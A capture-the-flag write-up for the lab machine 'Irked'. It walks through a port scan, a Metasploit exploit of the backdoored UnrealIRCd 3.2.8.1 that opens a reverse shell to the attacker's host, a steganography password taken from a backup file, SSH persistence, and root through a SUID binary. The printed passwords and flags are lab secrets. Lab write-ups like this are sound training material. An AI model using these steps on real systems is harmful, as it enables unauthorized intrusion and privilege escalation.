# Irked

## SYN Scan
```
nmap -sS -sV -O -p- -v -Pn -T4 -oA nmap/full_syn 10.10.10.117

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind 2-4 (RPC #100000)
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
56539/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd

Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## RCE via Vulnerable UnrealIRCd Version
`UnrealIRCd 3.2.8.1`, as distributed on certain mirror sites from November 2009 through June 2010, contains an externally introduced modification (Trojan Horse) in the DEBUG3_DOLOG_SYSTEM macro, which allows remote attackers to execute arbitrary commands.

https://www.cvedetails.com/cve/CVE-2010-2075/

https://www.exploit-db.com/exploits/16922

https://nvd.nist.gov/vuln/detail/CVE-2010-2075

`6697` is the default UnrealIRCd port but it's not responding.

The working UnrealIRCd port is `8067`.

```
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

[*] Started reverse TCP handler on 10.10.14.33:4444 
[*] 10.10.10.117:6697 - Connected to 10.10.10.117:6697...
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
[*] 10.10.10.117:6697 - Sending backdoor command...
[*] Command shell session 1 opened (10.10.14.33:4444 -> 10.10.10.117:58173) at 2021-04-04 00:53:00 +0300

id
uid=1001(ircd) gid=1001(ircd) groups=1001(ircd)
```

## djmardov Backup File
```
(remote) ircd@irked:/var/backups$ cat /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```

## Extract Password via Stenography
![irked](./www/irked.jpg)

Used the password which found in `.backup` file to extract secret password from `irked.jpg`. 

```
$ ls -l 
total 36
-rw-rw-r-- 1 cpt cpt 34697 Apr  4 01:22 irked.jpg
```

```
$ steghide extract -sf irked.jpg
wrote extracted data to "pass.txt".
```

```
$ ls -l pass.txt
-rw-rw-r-- 1 cpt cpt 17 Apr  4 01:26 pass.txt
```

```
$ cat pass.txt 
Kab6h+m+bbp2J:HG
```

## Privilege Escalation (djmardov)
Used the password which was embedded in `irked.jpg` to login as `djmardov` user.

```
djmardov@irked:~/Documents$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

### Persistent Login via SSH
```
djmardov@irked:~/.ssh$ ls -l
total 4
-rw------- 1 djmardov djmardov 553 Apr  3 18:32 authorized_keys
```

```
djmardov@irked:~/.ssh$ cat authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCofBiPGnXe1l+YJdIRzai7TtlQdbmyy648aHzzD6wQQILQsSzp2Irlgc/XaJf2Ohc/oMT7tiHE+cNZVMisQc46DE0kWqz0hw9kufwGq+Ug25MU64GLrI281sx34Z0UNWt8GqLLyGWxWxkzhcWGGuLOwBhqMjbpv6LEgd0x5A0WzfxdIb4UEQeHlQtQ0GDySSaczonJEEaaE+eGWAfZE+V1P3WERZEFARRjk2zYpwFFLFSdwnhE1CC56szv7w9iewwwSSFBZ1NjobXgzDOmPk0xW05R9E2pwBRmbD/dyftW2G/I7IH7/aLEceP1X0r+OnyScLEbV9P3pW6P30/137NZvWjn5HDf1iOxEcwr1giBcqunZr57x+BNTNlvk7nPQMyxVFrC5Pv2/wLWM6GFRbElXqmjDY/1AUQgPLa7tZFbi/evPAjjXn+Gd+a74iwludutdJehwrYDSrKOzI42PXv2RWslFpVXixtxvfmI8KMHaTFPwdQ9ebZy3RM8mx9WXIM=
```

```
$ ssh -l djmardov 10.10.10.117 -i ssh/djmardov_id_rsa

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
djmardov@irked:~$ id
uid=1000(djmardov) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

## The User Flag
```
(remote) ircd@irked:/home/djmardov/Documents$ ls -la
total 16
drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
drwxr-xr-x 18 djmardov djmardov 4096 Nov  3  2018 ..
-rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
-rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
```

```
djmardov@irked:~/Documents$ cat user.txt
4a66a78b12dc0e661a59d3f5c0267a8e
```

## Privilege Escalation (root)
The `viewuser` is not a standart Linux one and its `suid` bit was set.

```
djmardov@irked:~/Desktop$ find / -perm -u=s 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
...
/usr/bin/viewuser
...
/bin/umount
```

https://fuzzmymind.com/2019/05/29/suid-binary-exploit-a-primer/

```
djmardov@irked:/tmp$ /usr/bin/viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2021-04-03 16:00 (:0)
djmardov pts/1        2021-04-03 18:32 (10.10.14.33)
# id
uid=0(root) gid=1000(djmardov) groups=1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)
```

## The Root Flag
```
# ls -l /root
total 8
-rw-r--r-- 1 root root 17 May 14  2018 pass.txt
-rw------- 1 root root 33 May 15  2018 root.txt
```

```
# cat /root/root.txt
8d8e9e8be64654b6dccc3bff4522daf3
```
